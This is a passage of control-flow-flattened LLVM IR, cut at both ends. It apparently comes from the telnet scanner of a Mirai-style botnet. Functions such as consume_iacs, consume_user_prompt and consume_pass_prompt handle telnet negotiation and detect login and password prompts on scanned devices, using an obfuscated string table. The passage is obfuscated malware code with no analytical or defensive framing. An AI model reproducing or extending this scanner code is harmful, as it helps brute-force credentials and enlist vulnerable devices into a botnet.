    i32 -1178355086, label %125
    i32 -503172536, label %130
    i32 1330212383, label %131
    i32 -561901611, label %132
    i32 -598675437, label %135
    i32 664960329, label %145
    i32 -1564982975, label %146
    i32 -2144282514, label %147
    i32 -1549745835, label %148
    i32 1562929137, label %149
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %3, align 4
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 6
  %15 = load i32, i32* %14, align 4
  %16 = icmp slt i32 %12, %15
  %17 = select i1 %16, i32 -333949193, i32 1562929137
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp ne i32 %21, 255
  %23 = select i1 %22, i32 -233049431, i32 -1579045
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  store i32 1562929137, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i8*, i8** %4, align 8
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp eq i32 %28, 255
  %30 = select i1 %29, i32 166360983, i32 -2144282514
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %33 = load i8*, i8** %4, align 8
  %34 = call signext i8 @can_consume(%struct.scanner_connection* %32, i8* %33, i32 1)
  %35 = icmp ne i8 %34, 0
  %36 = select i1 %35, i32 692194876, i32 -1546514631
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 1562929137, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i8*, i8** %4, align 8
  %40 = getelementptr inbounds i8, i8* %39, i64 1
  %41 = load i8, i8* %40, align 1
  %42 = zext i8 %41 to i32
  %43 = icmp eq i32 %42, 255
  %44 = select i1 %43, i32 -1230500736, i32 767910832
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i8*, i8** %4, align 8
  %47 = getelementptr inbounds i8, i8* %46, i64 2
  store i8* %47, i8** %4, align 8
  %48 = load i32, i32* %3, align 4
  %49 = add nsw i32 %48, 2
  store i32 %49, i32* %3, align 4
  store i32 1418348082, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %4, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 253
  %56 = select i1 %55, i32 213508688, i32 1687484170
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %58, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @consume_iacs.tmp1, i32 0, i32 0), i64 3, i32 1, i1 false)
  %59 = bitcast [9 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %59, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @consume_iacs.tmp2, i32 0, i32 0), i64 9, i32 1, i1 false)
  %60 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %61 = load i8*, i8** %4, align 8
  %62 = call signext i8 @can_consume(%struct.scanner_connection* %60, i8* %61, i32 2)
  %63 = icmp ne i8 %62, 0
  %64 = select i1 %63, i32 -1426995499, i32 866363524
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 1562929137, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %4, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 2
  %69 = load i8, i8* %68, align 1
  %70 = zext i8 %69 to i32
  %71 = icmp ne i32 %70, 31
  %72 = select i1 %71, i32 -553775961, i32 -198887827
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  store i32 -277811787, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i8*, i8** %4, align 8
  %76 = getelementptr inbounds i8, i8* %75, i64 3
  store i8* %76, i8** %4, align 8
  %77 = load i32, i32* %3, align 4
  %78 = add nsw i32 %77, 3
  store i32 %78, i32* %3, align 4
  %79 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %80 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %79, i32 0, i32 1
  %81 = load i32, i32* %80, align 8
  %82 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i32 0, i32 0
  %83 = call i64 @send(i32 %81, i8* %82, i64 3, i32 16384)
  %84 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %85 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %84, i32 0, i32 1
  %86 = load i32, i32* %85, align 8
  %87 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i32 0, i32 0
  %88 = call i64 @send(i32 %86, i8* %87, i64 9, i32 16384)
  store i32 664960329, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 -277811787, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %92 = load i8*, i8** %4, align 8
  %93 = call signext i8 @can_consume(%struct.scanner_connection* %91, i8* %92, i32 2)
  %94 = icmp ne i8 %93, 0
  %95 = select i1 %94, i32 -1850757325, i32 955859749
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  store i32 1562929137, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 710150760, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* %5, align 4
  %100 = icmp slt i32 %99, 3
  %101 = select i1 %100, i32 145885371, i32 -598675437
  store i32 %101, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i8*, i8** %4, align 8
  %104 = load i32, i32* %5, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8, i8* %103, i64 %105
  %107 = load i8, i8* %106, align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 253
  %110 = select i1 %109, i32 1847672382, i32 -1784932631
  store i32 %110, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i8*, i8** %4, align 8
  %113 = load i32, i32* %5, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  store i8 -4, i8* %115, align 1
  store i32 1330212383, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = load i8*, i8** %4, align 8
  %118 = load i32, i32* %5, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds i8, i8* %117, i64 %119
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 251
  %124 = select i1 %123, i32 -1178355086, i32 -503172536
  store i32 %124, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load i8*, i8** %4, align 8
  %127 = load i32, i32* %5, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i8, i8* %126, i64 %128
  store i8 -3, i8* %129, align 1
  store i32 -503172536, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  store i32 1330212383, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  store i32 -561901611, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i32, i32* %5, align 4
  %134 = add nsw i32 %133, 1
  store i32 %134, i32* %5, align 4
  store i32 710150760, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  %136 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %137 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %136, i32 0, i32 1
  %138 = load i32, i32* %137, align 8
  %139 = load i8*, i8** %4, align 8
  %140 = call i64 @send(i32 %138, i8* %139, i64 3, i32 16384)
  %141 = load i8*, i8** %4, align 8
  %142 = getelementptr inbounds i8, i8* %141, i64 3
  store i8* %142, i8** %4, align 8
  %143 = load i32, i32* %3, align 4
  %144 = add nsw i32 %143, 3
  store i32 %144, i32* %3, align 4
  store i32 664960329, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  store i32 -1564982975, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  store i32 -2144282514, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  store i32 -1549745835, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  store i32 1418348082, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i32, i32* %3, align 4
  ret i32 %150

loopEnd:                                          ; preds = %148, %147, %146, %145, %135, %132, %131, %130, %125, %116, %111, %102, %98, %97, %96, %90, %89, %74, %73, %66, %65, %57, %50, %45, %38, %37, %31, %25, %24, %18, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_user_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = sub nsw i32 %13, 1
  store i32 %14, i32* %5, align 4
  %switchVar = alloca i32
  store i32 240169030, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 240169030, label %15
    i32 -987137464, label %19
    i32 -426266436, label %29
    i32 980776106, label %39
    i32 -1869088308, label %49
    i32 -2011511883, label %59
    i32 -1950040776, label %69
    i32 363594042, label %72
    i32 2044750862, label %73
    i32 312778213, label %76
    i32 559407984, label %80
    i32 1183915736, label %96
    i32 1471395190, label %98
    i32 2121936489, label %112
    i32 -1098620063, label %114
    i32 -1713065720, label %115
    i32 -1453084369, label %116
    i32 -617248094, label %120
    i32 -1551776359, label %121
    i32 -349502505, label %123
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32, i32* %5, align 4
  %17 = icmp sgt i32 %16, 0
  %18 = select i1 %17, i32 -987137464, i32 312778213
  store i32 %18, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %21 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %20, i32 0, i32 7
  %22 = load i32, i32* %5, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds [256 x i8], [256 x i8]* %21, i64 0, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = sext i8 %25 to i32
  %27 = icmp eq i32 %26, 58
  %28 = select i1 %27, i32 -1950040776, i32 -426266436
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 7
  %32 = load i32, i32* %5, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds [256 x i8], [256 x i8]* %31, i64 0, i64 %33
  %35 = load i8, i8* %34, align 1
  %36 = sext i8 %35 to i32
  %37 = icmp eq i32 %36, 62
  %38 = select i1 %37, i32 -1950040776, i32 980776106
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %41 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %40, i32 0, i32 7
  %42 = load i32, i32* %5, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds [256 x i8], [256 x i8]* %41, i64 0, i64 %43
  %45 = load i8, i8* %44, align 1
  %46 = sext i8 %45 to i32
  %47 = icmp eq i32 %46, 36
  %48 = select i1 %47, i32 -1950040776, i32 -1869088308
  store i32 %48, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %51 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %50, i32 0, i32 7
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [256 x i8], [256 x i8]* %51, i64 0, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = icmp eq i32 %56, 35
  %58 = select i1 %57, i32 -1950040776, i32 -2011511883
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %61 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %60, i32 0, i32 7
  %62 = load i32, i32* %5, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds [256 x i8], [256 x i8]* %61, i64 0, i64 %63
  %65 = load i8, i8* %64, align 1
  %66 = sext i8 %65 to i32
  %67 = icmp eq i32 %66, 37
  %68 = select i1 %67, i32 -1950040776, i32 363594042
  store i32 %68, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %5, align 4
  %71 = add nsw i32 %70, 1
  store i32 %71, i32* %6, align 4
  store i32 312778213, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  store i32 2044750862, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %5, align 4
  %75 = add nsw i32 %74, -1
  store i32 %75, i32* %5, align 4
  store i32 240169030, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = load i32, i32* %6, align 4
  %78 = icmp eq i32 %77, -1
  %79 = select i1 %78, i32 559407984, i32 -1453084369
  store i32 %79, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 26)
  call void @table_unlock_val(i8 zeroext 27)
  %81 = call i8* @table_retrieve_val(i32 26, i32* %8)
  store i8* %81, i8** %9, align 8
  %82 = call i8* @table_retrieve_val(i32 27, i32* %8)
  store i8* %82, i8** %10, align 8
  %83 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %84 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %83, i32 0, i32 7
  %85 = getelementptr inbounds [256 x i8], [256 x i8]* %84, i32 0, i32 0
  %86 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %87 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %86, i32 0, i32 6
  %88 = load i32, i32* %87, align 4
  %89 = load i8*, i8** %9, align 8
  %90 = load i32, i32* %8, align 4
  %91 = sub nsw i32 %90, 1
  %92 = call i32 @util_memsearch(i8* %85, i32 %88, i8* %89, i32 %91)
  %93 = icmp ne i32 %92, -1
  %94 = zext i1 %93 to i32
  store i32 %94, i32* %7, align 4
  %95 = select i1 %93, i32 1183915736, i32 1471395190
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %7, align 4
  store i32 %97, i32* %6, align 4
  store i32 -1713065720, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %100 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %99, i32 0, i32 7
  %101 = getelementptr inbounds [256 x i8], [256 x i8]* %100, i32 0, i32 0
  %102 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %103 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %102, i32 0, i32 6
  %104 = load i32, i32* %103, align 4
  %105 = load i8*, i8** %10, align 8
  %106 = load i32, i32* %8, align 4
  %107 = sub nsw i32 %106, 1
  %108 = call i32 @util_memsearch(i8* %101, i32 %104, i8* %105, i32 %107)
  %109 = icmp ne i32 %108, -1
  %110 = zext i1 %109 to i32
  store i32 %110, i32* %7, align 4
  %111 = select i1 %109, i32 2121936489, i32 -1098620063
  store i32 %111, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load i32, i32* %7, align 4
  store i32 %113, i32* %6, align 4
  store i32 -1098620063, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  store i32 -1713065720, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  store i32 -1453084369, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  call void @table_lock_val(i8 zeroext 26)
  call void @table_lock_val(i8 zeroext 27)
  %117 = load i32, i32* %6, align 4
  %118 = icmp eq i32 %117, -1
  %119 = select i1 %118, i32 -617248094, i32 -1551776359
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -349502505, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load i32, i32* %6, align 4
  store i32 %122, i32* %2, align 4
  store i32 -349502505, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  %124 = load i32, i32* %2, align 4
  ret i32 %124

loopEnd:                                          ; preds = %121, %120, %116, %115, %114, %112, %98, %96, %80, %76, %73, %72, %69, %59, %49, %39, %29, %19, %15, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_pass_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %10 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %11 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %10, i32 0, i32 6
  %12 = load i32, i32* %11, align 4
  %13 = sub nsw i32 %12, 1
  store i32 %13, i32* %5, align 4
  %switchVar = alloca i32
  store i32 725793180, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 725793180, label %14
    i32 -987556666, label %18
    i32 -87326973, label %28
    i32 -13059355, label %38
    i32 -1104016641, label %48
    i32 2045373356, label %58
    i32 -719424340, label %61
    i32 -1213061742, label %62
    i32 1273735036, label %65
    i32 937320404, label %69
    i32 -1066778866, label %84
    i32 1632106442, label %86
    i32 325723402, label %87
    i32 -43413867, label %91
    i32 263931754, label %92
    i32 -251097781, label %94
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %5, align 4
  %16 = icmp sgt i32 %15, 0
  %17 = select i1 %16, i32 -987556666, i32 1273735036
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %19, i32 0, i32 7
  %21 = load i32, i32* %5, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [256 x i8], [256 x i8]* %20, i64 0, i64 %22
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 58
  %27 = select i1 %26, i32 2045373356, i32 -87326973
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %30 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %29, i32 0, i32 7
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i64 0, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp eq i32 %35, 62
  %37 = select i1 %36, i32 2045373356, i32 -13059355
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %40 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %39, i32 0, i32 7
  %41 = load i32, i32* %5, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds [256 x i8], [256 x i8]* %40, i64 0, i64 %42
  %44 = load i8, i8* %43, align 1
  %45 = sext i8 %44 to i32
  %46 = icmp eq i32 %45, 36
  %47 = select i1 %46, i32 2045373356, i32 -1104016641
  store i32 %47, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %50 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %49, i32 0, i32 7
  %51 = load i32, i32* %5, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [256 x i8], [256 x i8]* %50, i64 0, i64 %52
  %54 = load i8, i8* %53, align 1
  %55 = sext i8 %54 to i32
  %56 = icmp eq i32 %55, 35
  %57 = select i1 %56, i32 2045373356, i32 -719424340
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %5, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %6, align 4
  store i32 1273735036, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 -1213061742, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %5, align 4
  %64 = add nsw i32 %63, -1
  store i32 %64, i32* %5, align 4
  store i32 725793180, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %6, align 4
  %67 = icmp eq i32 %66, -1
  %68 = select i1 %67, i32 937320404, i32 325723402
  store i32 %68, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 25)
  %70 = call i8* @table_retrieve_val(i32 25, i32* %9)
  store i8* %70, i8** %7, align 8
  %71 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %72 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %71, i32 0, i32 7
  %73 = getelementptr inbounds [256 x i8], [256 x i8]* %72, i32 0, i32 0
  %74 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %75 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %74, i32 0, i32 6
  %76 = load i32, i32* %75, align 4
  %77 = load i8*, i8** %7, align 8
  %78 = load i32, i32* %9, align 4
  %79 = sub nsw i32 %78, 1
  %80 = call i32 @util_memsearch(i8* %73, i32 %76, i8* %77, i32 %79)
  %81 = icmp ne i32 %80, -1
  %82 = zext i1 %81 to i32
  store i32 %82, i32* %8, align 4
  %83 = select i1 %81, i32 -1066778866, i32 1632106442
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %8, align 4
  store i32 %85, i32* %6, align 4
  store i32 1632106442, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  store i32 325723402, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  call void @table_lock_val(i8 zeroext 25)
  %88 = load i32, i32* %6, align 4
  %89 = icmp eq i32 %88, -1
  %90 = select i1 %89, i32 -43413867, i32 263931754
  store i32 %90, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -251097781, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = load i32, i32* %6, align 4
  store i32 %93, i32* %2, align 4
  store i32 -251097781, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %2, align 4
  ret i32 %95

loopEnd:                                          ; preds = %92, %91, %87, %86, %84, %69, %65, %62, %61, %58, %48, %38, %28, %18, %14, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_any_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %7 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %7, i32 0, i32 6
  %9 = load i32, i32* %8, align 4
  %10 = sub nsw i32 %9, 1
  store i32 %10, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -152606953, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -152606953, label %11
    i32 -1959413697, label %15
    i32 -1827045317, label %25
    i32 -2104775557, label %35
    i32 1747708361, label %45
    i32 -631762574, label %55
    i32 71172090, label %65
    i32 -1408983188, label %68
    i32 141910662, label %69
    i32 1321940432, label %72
    i32 2121315148, label %76
    i32 1633606645, label %77
    i32 1067526966, label %79
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %5, align 4
  %13 = icmp sgt i32 %12, 0
  %14 = select i1 %13, i32 -1959413697, i32 1321940432
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %17 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %16, i32 0, i32 7
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [256 x i8], [256 x i8]* %17, i64 0, i64 %19
  %21 = load i8, i8* %20, align 1
  %22 = sext i8 %21 to i32
  %23 = icmp eq i32 %22, 58
  %24 = select i1 %23, i32 71172090, i32 -1827045317
  store i32 %24, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %26, i32 0, i32 7
  %28 = load i32, i32* %5, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [256 x i8], [256 x i8]* %27, i64 0, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 62
  %34 = select i1 %33, i32 71172090, i32 -2104775557
  store i32 %34, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %37 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %36, i32 0, i32 7
  %38 = load i32, i32* %5, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [256 x i8], [256 x i8]* %37, i64 0, i64 %39
  %41 = load i8, i8* %40, align 1
  %42 = sext i8 %41 to i32
  %43 = icmp eq i32 %42, 36
  %44 = select i1 %43, i32 71172090, i32 1747708361
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %47 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %46, i32 0, i32 7
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds [256 x i8], [256 x i8]* %47, i64 0, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = sext i8 %51 to i32
  %53 = icmp eq i32 %52, 35
  %54 = select i1 %53, i32 71172090, i32 -631762574
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
